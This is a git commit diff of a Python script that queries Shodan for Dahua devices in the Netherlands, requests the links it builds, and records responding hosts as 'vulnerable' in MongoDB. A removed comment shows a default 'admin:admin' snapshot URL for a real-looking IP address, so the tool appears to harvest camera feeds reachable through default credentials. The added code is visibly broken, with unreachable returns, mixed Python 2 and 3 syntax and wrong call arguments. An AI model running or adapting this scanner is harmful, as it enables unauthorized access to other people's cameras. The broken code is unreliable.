07d03c76c13416c523ff7c4f9d55ed2468874dc3
Alec <alec@siemerink.org>
2020-04-07 22:44:21 +0200

    Collector done
    working on adding vulnerable results to MongoDB for later use in webapp.

--- api.py
+++ api.py
@@ -1,48 +1,28 @@
 import requests
 import shodan
-import eventlet
-from requests import Timeout
-
+from pymongo import MongoClient
 from secrets import *
 
 api = shodan.Shodan(SHODAN_API_KEY)
+client = MongoClient(mongodb_key)
+db = client.addresses
 
 
-# YET TO DECIDE WHICH FUNCTION TO USE
 def getaddresses():
-    limit = 3
+    limit = 1
     counter = 0
     iplist = []
     for banner in api.search_cursor('Dahua country:NL'):
-        # Perform some custom manipulations or stream the results to a database
-        # For this example, I'll just print out the "data" property
         ip = str(banner['ip_str'])
         city = str(banner['location'])
-        print(ip)
-        print(city)
         iplist.append(ip)
         # Keep track of how many results have been downloaded so we don't use up all our query credits
         counter += 1
         if counter >= limit:
             break
+    return ip
+    return city
     return iplist
-
-
-# def getAddresses():
-#     try:
-#         # Search Shodan
-#         results = api.search('Dahua country:NL')
-#         # Show the results
-#         ipList = []
-#         print('Results found: {}'.format(results['total']))
-#         for result in results['matches']:
-#             ip = str(result['ip_str'])
-#             print(ip)
-#             ipList.append(ip)
-#         return ipList
-#     except shodan.APIError as e:
-#         print('Error: {}'.format(e))
-#     return ipList
 
 
 def linkbuilder(iplist):
@@ -53,29 +33,23 @@ def linkbuilder(iplist):
     return linklist
 
 
-# print(linkbuilder(getaddresses()))
-
-
-def request(linklist):
+def request(linklist, iplist, city, ip):
     vulnlist = []
     for link in linklist:
+        print link
         try:
             response = requests.get(link, verify=False, timeout=3)
             if response.status_code == 200:
-                vulnlist.append(link)
-        except Timeout as ex:
-            print("Exception raised:" + ex)
+                vulnlist.append(iplist[linklist.index(link)])
+                addresses = {
+                    'number: ': vulnlist.len(),
+                    'location: ': city,
+                    'ip: ': ip
+                }
+        except:
+            pass
+    print addresses
     return vulnlist
 
 
-print(request(linkbuilder(getaddresses())))
-
-
-# vulnlist = []
-# link = 'http://admin:admin@82.176.209.4/cgi-bin/snapshot.cgi'
-# resp = requests.get(link)
-# if resp.status_code == 200:
-#     vulnlist.append(link)
-#     print("succes")
-#
-# print(vulnlist)
+print(request(linkbuilder(getaddresses()), getaddresses()))
